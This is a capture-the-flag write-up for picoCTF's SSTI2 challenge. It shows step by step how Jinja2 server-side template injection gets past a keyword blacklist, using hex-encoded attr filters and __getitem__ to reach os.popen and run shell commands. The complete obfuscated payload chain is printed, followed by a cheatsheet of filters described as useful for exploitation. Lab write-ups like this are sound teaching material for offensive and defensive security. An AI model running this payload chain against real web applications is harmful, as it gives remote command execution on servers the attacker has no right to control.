## 📝 SSTI2 Challenge Walkthrough

In this challenge, we’re dealing with a **Server-Side Template Injection (SSTI)** vulnerability—but with heavy input filtering.

---

### Step 1: Confirm SSTI

We start by testing whether SSTI is possible:

```jinja2
{{ 7*7 }}
```

It returns 49, so SSTI is enabled.

---

### Step 2: Bypassing Keyword Blacklisting

Trying a textbook payload:

```jinja2
{{ "".__class__.__base__.__subclasses__() }}
```

...results in an error: “stop trying to break me”.

This means keywords like `class`, `base`, `subclasses`, and even `""` (an empty string) are blacklisted.

I tried using a custom string like `"idk"` instead of `""`:

```jinja2
{{ idk.__class__ }}
```

...but even that failed due to the sanitization.

Attempts like:
- Unicode/hex encoding `__class__`
- URL-encoding newline characters
- POSTing a newline

...all failed due to filters and sandbox constraints.

---

### Step 3: Exploring Filters & `attr`

I noticed that:

```jinja2
{{ idk | }}
```

...does not trigger an error, meaning filters are allowed.

So what are filters in Flask Jinja2?

Filters are built-in functions in Jinja2 that let you modify or format data before it's rendered in the template. They're used inside double curly braces like this:

```jinja2
{{ variable | filter_name }}
```

You can even pass arguments to them:

```jinja2
{{ variable | filter_name(arg1, arg2) }}
```

They’re super helpful for cleaning up, transforming, or accessing data without writing any Python code in your backend. For example:
- `{{ "HELLO" | lower }}` becomes `"hello"`
- `{{ mylist | length }}` gives the number of items
- `{{ user | default("Guest") }}` shows `"Guest"` if `user` is undefined

In this challenge, filters aren’t just for formatting — they’re a way to sneak around input filters. That’s where `attr()` came in clutch: it let us access blocked attributes like `__class__` using their string names (which we hex-encoded to avoid detection).

So I dug into filter functions and found the holy grail: `attr`.

> `attr` allows you to dynamically access an attribute of an object using a string.

But directly accessing blacklisted attributes like `__class__` still failed:

```jinja2
{{ idk | attr("__class__") }}
```

So I hex-encoded it:

```jinja2
{{ idk | attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') }}
```

Success! We got the class.

I continued by hex-encoding the rest of the chain:

```jinja2
{{ idk
  | attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') # __class__ hex encoded
  | attr('\x5f\x5f\x62\x61\x73\x65\x5f\x5f') # __base__ hex encoded
  | attr('\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f')() # _subclasses__ hex encoded
}}
```

---

### Step 4: Finding the `warnings.catch_warnings` Class

In the output of `__subclasses__()`, I looked for `warnings.catch_warnings` (a known trick, since its `__init__` uses `sys.modules` which gives us access to the os module --> open a shell).

You can look for its existence using a chatgpt or deepseek or another method that i strongly recommend since ai never gave me the right index 😅, is to use python and here is what i always use:

```python
# something.txt should contain all the subclasses
with open('something.txt') as p:
    check = p.read()
for index,value in enumerate(check.split(',')):
    if "<class 'warnings.catch_warnings'>" in value:
        print(index)
```

It existed! At index 221.

But this didn't work:

```jinja2
(...subclasses__())[221]
```

Why? Because:
- `[]` is blacklisted
- Calling functions (`()`) often triggers errors in sandboxed environments

---

### 💡 Step 5: Bypassing with `__getitem__`

Instead of using `[]`, I used:

```jinja2
| attr('__getitem__')(221)
```

That works because:
> `__getitem__` lets us simulate `obj[221]` without using square brackets.
in Jinja2, the attr filter (also called attribute) is used to dynamically access an attribute of an object by name (as a string). It’s useful when the attribute name is stored in a variable or constructed dynamically.


Here’s the full, chained payload:

```jinja2
{{ idk
  | attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') # __class__ hex encoded
  | attr('\x5f\x5f\x62\x61\x73\x65\x5f\x5f') # __base__ hex encoded
  | attr('\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f')() # _subclasses__ hex encoded, we can't index/call the warnings subclass so we use getitem
  | attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')(221) # __getitem__ hex encoded and we get the 221th item which is the warning subclass
  | attr('\x5f\x5f\x69\x6e\x69\x74\x5f\x5f') # __init__ hex encoded to call the init method
  | attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f') # __globals__ to access the global variable, we can't access the sys variable directly here so we use getitem again
  | attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('sys') #  __getitem__ hex encoded and we get the sys variable
  | attr('modules') # we access its modules (which contains os), we can't access the os module directly because we're calling a function and calling a function triggers an error
  | attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('os') # so we use getitem again!, __getitem__ hex encoded
  | attr('popen')('cat flag') # accessing the popen function to opne a shell and execute "cat flag" (i executed ls first and then when i saw the flag.txt i cat'ed it)
  | attr('read')() # and here so we can see the output of the popen
}}
```

---

### Step 6: Get the Flag

Paste the full payload into the form input, and...

BOOM — you get the flag:

```bash
picoCTF{... redacted ...}
```

---

## 🧰 Useful Jinja2 Filters for SSTI & Exploitation

Here’s a mini cheatsheet of filters that are particularly useful in SSTI/CTF contexts:

| Filter         | Purpose                                         |
|----------------|-------------------------------------------------|
| `attr()`       | Dynamically access attributes like `__class__`  |
| `e` / `escape` | Escape HTML (sometimes bypasses filters)        |
| `safe`         | Mark string as safe (no escaping)               |
| `default()`    | Provide fallback values to avoid breaking logic |
| `length`       | Get length of iterable (can test logic flow)    |
| `join`         | Concatenate strings from a list (may help with payload shaping) |
| `replace`      | Modify strings mid-template (bypass filters)    |

---

> Just look at that payload... it’s a masterpiece. 
> If you’ve reached this point and understood the entire chain — 🫡. 

